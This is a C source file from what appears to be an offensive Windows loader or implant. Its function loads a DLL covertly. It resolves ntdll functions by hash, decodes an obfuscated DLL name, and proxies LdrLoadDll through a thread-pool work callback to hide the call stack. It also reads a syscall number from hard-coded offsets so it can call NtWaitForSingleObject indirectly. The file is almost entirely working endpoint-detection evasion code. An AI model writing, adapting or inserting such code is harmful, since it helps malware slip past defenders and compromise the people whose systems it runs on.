#include "../include/AddrResolution.h"
#include "../include/StringUtils.h"
#include "../include/syscalls.h"
#include "../include/macros.h"
#include "../include/DllOps.h"
#include "../include/ntdll.h"
#include "../include/decoding.h"


typedef unsigned __int64 QWORD;

extern NTSTATUS    (NTAPI *pTpAllocWork)           (PTP_WORK, PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
extern void        (NTAPI *pTpPostWork)            (PTP_WORK);
extern void        (NTAPI *pTpReleaseWork)         (PTP_WORK);

extern void CALLBACK LdrLoadWorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
extern void *pNTDLL;

typedef struct _LDRLOADDLL_ARGS {
    UINT_PTR        pLdrLoadDll;
    PWSTR           DllPath;
    PWSTR           DllCharacteristics;
    PUNICODE_STRING DllName;
    PVOID           *DllHandle;
} LDRLOADDLL_ARGS, *PLDRLOADDLL_ARGS;

extern DWORD NtWaitForSingleObjectSSN;
extern QWORD NtWaitForSingleObjectSyscall;


void *LoadDll(unsigned short *DllName) {
    void            *DllAddress     = NULL;
    UNICODE_STRING  DllInfo         = {0};
    LDRLOADDLL_ARGS LdrLoadDllArgs  = {0};
    LARGE_INTEGER   WaitTime        = {0};
    PTP_WORK        WorkReturn      = NULL;

    if (pNTDLL == NULL) {
        pNTDLL          = GetDllAddress(NTDHASH);
        pTpAllocWork    = NULL;
        pTpPostWork     = NULL;
        pTpReleaseWork  = NULL;
    }

    if (pTpAllocWork == NULL) {
        pTpAllocWork            = GetFuncAddress(pNTDLL, TPALLOCWORK);
        pTpPostWork             = GetFuncAddress(pNTDLL, TPPOSTWORK);
        pTpReleaseWork          = GetFuncAddress(pNTDLL, TPRELEASEWORK);
    }

    DecodeStringW(DllName);
    DllInfo.Buffer          = DllName;
    DllInfo.MaximumLength   = (DllInfo.Length = (USHORT)(lenW(DllName) * sizeof(WCHAR))) + sizeof(UNICODE_NULL);

    LdrLoadDllArgs.pLdrLoadDll          = (UINT_PTR) GetFuncAddress(pNTDLL, LDRLOADDLL);
    LdrLoadDllArgs.DllPath              = NULL;
    LdrLoadDllArgs.DllCharacteristics   = NULL;
    LdrLoadDllArgs.DllName              = &DllInfo;
    LdrLoadDllArgs.DllHandle            = &DllAddress;

    pTpAllocWork(&WorkReturn, (PTP_WORK_CALLBACK)LdrLoadWorkCallback, &LdrLoadDllArgs, NULL);
    pTpPostWork(WorkReturn);
    pTpReleaseWork(WorkReturn);

    WaitTime.QuadPart               = -1500 * 10000;
    if (NtWaitForSingleObjectSSN == 0 || NtWaitForSingleObjectSyscall == 0) {
        if (pNTDLL == NULL) {
            pNTDLL = GetDllAddress(NTDHASH);
        }

        NtWaitForSingleObjectSyscall    = GetFuncAddress(pNTDLL, NTWAITOBJ) + 0x12;
        NtWaitForSingleObjectSSN        = ((PBYTE)(NtWaitForSingleObjectSyscall - 0xe))[0];
    }
    NtWaitForSingleObject((HANDLE)-1, FALSE, &WaitTime);

    return DllAddress;
}